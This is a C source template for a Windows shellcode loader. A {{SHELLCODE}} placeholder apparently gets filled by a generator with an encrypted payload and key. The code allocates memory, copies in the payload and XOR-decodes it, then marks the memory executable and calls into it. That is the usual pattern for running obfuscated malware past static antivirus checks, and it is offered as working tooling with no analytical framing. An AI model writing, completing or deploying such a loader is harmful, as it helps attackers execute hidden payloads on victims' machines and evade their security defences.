#include <windows.h>
#include <stdio.h>


void XOR(char * ciphertext, size_t ciphertext_len, char * key, size_t key_len) {
    int myByte = 0;
    for (int idx = 0;  idx < ciphertext_len; idx++) {
        if (myByte == key_len)
        { 
            myByte = 0;
        }
        
        ciphertext[idx] = ciphertext[idx] ^ key[myByte];
        myByte++;
    }
}


int main(void)
{
	DWORD result;
	{{SHELLCODE}}
	
	// Allocate memory for the shellcode RW
    char *dest = VirtualAlloc(NULL, sizeof(shellcode), 0x3000, PAGE_READWRITE);
	if (dest == NULL) {
		return 1;
	}

	// Copy the shellcode to the allocated memory
	memcpy(dest, shellcode, sizeof(shellcode));

	// Decode the shellcode
	XOR((char *) dest, sizeof(shellcode), xorkey, strlen(xorkey));

	// Change memory protection to RX
	if (VirtualProtect(dest, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &result) == 0) {
		return 2;
	}

    // Execute *dest
    (*(void(*)())(dest))();
	
	return 0;
}
